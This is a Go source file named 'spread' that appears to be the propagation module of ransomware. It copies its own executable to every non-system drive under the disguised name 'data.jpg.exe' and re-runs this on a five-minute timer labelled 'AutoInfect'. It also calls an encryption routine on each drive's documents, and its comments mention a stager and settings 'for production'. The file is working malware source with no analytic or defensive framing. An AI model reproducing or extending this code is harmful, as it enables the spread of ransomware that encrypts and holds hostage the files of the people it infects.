package spread

import "github.com/cleversoap/go-cp"
import "os"
import "strings"
import "time"

func CopyToDrives() {
	drives := GetDrives()
	for _, drive := range drives {
		if drive != "C" {
			cp.Copy(os.Args[0], drive+":\\data.jpg.exe") //TODO predownload stager and copy stager
		}
	}
}

/* Encrypts external drives */
func EncryptExternalDrives(mode bool) {
	drives := GetDrives()
	for _, drive := range drives {
		EncryptDocumets(drive+":\\", mode)
	}
}

func GetExeName() string {
	filename := strings.Split(os.Args[0], "\\")
	return filename[len(filename)-1]
}

func GetParentFolder() string {
	filename := strings.Split(os.Args[0], "\\")
	return filename[len(filename)-2]
}

func GetDrives() (r []string) {
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		_, err := os.Open(string(drive) + ":\\")
		if err == nil {
			r = append(r, string(drive))
		}
	}
	return
}

var ticker = time.NewTicker(5 * time.Minute) //Increase delay for production
var quit = make(chan struct{})

func AutoInfect() {

	for {
		select {
		case <-ticker.C:
			go CopyToDrives()
		case <-quit:
			ticker.Stop()
			return
		}
	}
}

func StopAutoInfect() {
	close(quit)
}
